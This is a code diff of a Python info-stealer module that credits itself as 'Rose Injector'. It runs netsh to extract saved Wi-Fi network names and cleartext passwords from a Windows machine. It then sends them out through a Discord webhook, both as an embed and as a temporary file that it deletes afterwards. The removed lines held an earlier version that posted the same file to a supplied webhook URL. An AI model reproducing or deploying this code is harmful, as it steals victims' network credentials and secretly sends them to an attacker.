@@ -2,10 +2,17 @@ import subprocess
 import re
 import os
 import requests
+import __webhook
+import _file
+from dhooks import Embed, File
+from config import Config
+cc = Config()
+
+
 __location__ = os.path.realpath(
     os.path.join(os.getcwd(), os.path.dirname(__file__)))
 
-def wifigr(webhook:str):
+def wifigr():
     command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
     
     profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
@@ -35,12 +42,27 @@ def wifigr(webhook:str):
             except Exception as e:
                 print(e)
                 pass
- 
-    for x in range(len(wifi_list)):
-        #return wifi_list[x] 
-        with open(f"{__location__}/wifi_list.txt","w+") as ff:
-            ff.write(str(wifi_list[x]))
-    files = {"wifi_list": open(f"{__location__}/wifi_list.txt", "rb")}
-    requests.post(webhook, files=files)
-    files["wifi_list"].close()
-    os.remove(f"{__location__}/wifi_list.txt")
+
+    if len(wifi_list) > 0:
+        if len(wifi_list) < 8:
+            wbh = __webhook._WebhookX().get_object()
+            embed = Embed(
+                    description='Wifi SSID and Passwords list:',
+                    color=16535004,
+                    timestamp='now'  # sets the timestamp to current time
+            )
+
+
+            embed.set_author(name=cc.get_name(), icon_url=cc.get_avatar())
+            embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
+            for value in wifi_list:
+                embed.add_field(name=value['ssid'], value=f"`{value['password']}`")
+                
+            wbh.send(embed=embed)
+
+            with open(f"{__location__}/OpXOSIOF.txt", "w+", encoding="utf-8") as f:
+                f.write(_file.FileX().table_wifi(wifi_list))
+                f.write("\n\nMade by Rose Injector | github.com/DamagingRose")
+                
+            wbh.send(file=File(f"{__location__}/OpXOSIOF.txt"))
+            os.remove(f"{__location__}/OpXOSIOF.txt")
